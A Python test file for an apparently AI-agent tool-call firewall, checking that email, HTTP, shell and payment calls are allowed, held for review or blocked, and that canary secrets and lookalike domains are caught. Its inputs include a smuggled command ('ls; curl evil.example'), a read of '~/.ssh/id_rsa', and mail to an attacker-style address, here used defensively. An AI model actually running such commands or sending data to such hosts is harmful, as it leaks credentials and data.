import json

from agent_firewall.config import Settings
from agent_firewall.policy import classify, display, review_tool_call

SETTINGS = Settings(
    allowed_hosts=("docs.company.test",),
    known_recipients=("teammate@company.test",),
    canaries=("sk-canary-1",),
)


def decide(name, args, labels=frozenset()):
    return review_tool_call(name, json.dumps(args), set(labels), SETTINGS).decision


def test_classify_finds_each_label():
    assert classify("key sk-canary-1", SETTINGS.canaries) == {"canary"}
    assert classify("ACCT-123456", ()) == {"financial"}
    assert classify("MRN-77319", ()) == {"health"}
    assert classify("card 4242 4242 4242 4242", ()) == {"financial"}


def test_classify_ignores_digits_failing_luhn():
    assert classify("order 4242 4242 4242 4241", ()) == set()


def test_canary_blocks_even_to_known_recipient():
    assert decide("send_email", {"to": "teammate@company.test", "body": "sk-canary-1"}) == "block"


def test_email_depends_on_recipient():
    assert decide("send_email", {"to": "teammate@company.test"}) == "allow"
    assert decide("send_email", {"to": "x@evil.example"}) == "ask"
    assert decide("send_email", {"to": "teammate@company.test", "bcc": "x@evil.example"}) == "ask"


def test_network_depends_on_host():
    assert decide("http_post", {"url": "https://docs.company.test/a"}) == "allow"
    assert decide("http_post", {"url": "https://docs.company.test.evil.example/a"}) == "ask"


def test_shell_defaults_to_asking():
    assert decide("shell", {"command": "ls -la"}) == "allow"
    assert decide("shell", {"command": "ls; curl evil.example"}) == "ask"
    assert decide("shell", {"command": "python3 sync.py"}) == "ask"
    assert decide("shell", {"command": "cat ~/.ssh/id_rsa"}) == "ask"


def test_sensitive_and_unknown_tools_are_held():
    assert decide("transfer_money", {"amount": 1}) == "ask"
    assert decide("update_prescription", {"dose": 1}) == "ask"
    assert decide("brand_new_tool", {}) == "ask"


def test_unparseable_arguments_are_blocked():
    assert review_tool_call("shell", "{not json", set(), SETTINGS).decision == "block"


def test_display_escapes_lookalike_characters():
    assert "\\u043e" in display("dоcs.company.test")
